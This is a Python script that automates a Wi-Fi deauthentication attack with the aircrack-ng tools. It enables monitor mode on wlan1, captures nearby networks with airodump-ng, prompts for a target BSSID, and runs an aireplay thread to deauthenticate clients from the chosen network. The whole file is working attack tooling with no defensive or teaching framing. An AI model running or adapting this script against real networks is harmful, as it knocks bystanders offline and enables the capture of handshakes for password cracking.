import os
import random
import subprocess
import time
import pandas
from pandas import DataFrame, read_csv
from subprocess import PIPE
from time import sleep

from AireplayThread import AireplayThread
from AirodumpThread import AirodumpThread
from parseOutput import AiroParser

airmon_cmd_template = 'airmon-ng'
PATH = os.environ['PATH']
env = {'PATH': PATH, 'MON_PREFIX': 'smoothie'}


def startInterface(interface):
    airmon_cmd = list()
    airmon_cmd.append(airmon_cmd_template)
    airmon_cmd.append('start')
    airmon_cmd.append(interface)

    print(airmon_cmd)

    airmon_process = subprocess.Popen(airmon_cmd, stdout=PIPE, stderr=PIPE, env=env)

    try:
        outs, errs = airmon_process.communicate(timeout=15)
    except subprocess.TimeoutExpired:
        airmon_process.kill()
        outs, errs = airmon_process.communicate()

    err_str = errs.decode('utf-8')
    out_str = outs.decode('utf-8')

    print(out_str)

    interface_success = interface + 'mon'

    if interface_success in out_str:
        return True
    else:
        return False


def stopInterface(interface):
    interface = interface + 'mon'
    airmon_cmd = list()
    airmon_cmd.append(airmon_cmd_template)
    airmon_cmd.append('stop')
    airmon_cmd.append(interface)

    airmon_process = subprocess.Popen(airmon_cmd, stdout=PIPE, stderr=PIPE, env=env)

    try:
        outs, errs = airmon_process.communicate(timeout=15)
    except subprocess.TimeoutExpired:
        airmon_process.kill()
        outs, errs = airmon_process.communicate()

    err_str = errs.decode('ascii')
    out_str = outs.decode('ascii')

    print(out_str)

    interface_success = interface

    if interface_success in out_str:
        return True
    else:
        return False


def getRandomName():
    return ''.join(random.choice('0123456789ABCDEF') for i in range(5))


def main():
    interface = 'wlan1'
    print('Starting...')
    if startInterface(interface):
        # continue, because airmon was successful
        output_name = 'output-{}'.format(getRandomName())
        arg_list = list()
        arg_list.append('--write')
        arg_list.append(output_name)
        arg_list.append('--output-format')
        arg_list.append('csv')

        thread1 = AirodumpThread(1, interface, arg_list)
        thread1.setDaemon(True)
        thread1.start()

        startTime = time.time()
        print()
        print('Giving airodump time to capture', end='', flush=True)
        while time.time() - startTime <= 10:
            print('.', end='', flush=True)
            sleep(2)
        print()

        thread1.stop()
        sleep(1)
        if not thread1.is_alive():
            print("Successfully stopped thread with id {}".format(thread1.thread_id))

        fileName = output_name + '-01.csv'

        parser = AiroParser(fileName)
        parser.pandaParse()

        print('Please select your desired network')
        for idx, net in enumerate(parser.available_bssids):
            print('{0}) {1}'.format(idx, net))

        try:
            selected = int(input())
        except ValueError:
            print('Input is not a number')
            exit(-1)

        thread2 = AireplayThread(2, interface, parser.available_bssids[selected])
        thread2.setDaemon(True)
        thread2.start()

        startTime = time.time()
        print()
        print('Giving aireplay time to deauth...', end='', flush=True)
        while time.time() - startTime <= 10:
            print('.', end='', flush=True)
            sleep(2)
        print()

        thread2.stop()
        sleep(1)

    else:
        print('Error starting interface {0}'.format(interface))
        return -1


if __name__ == '__main__':
    main()
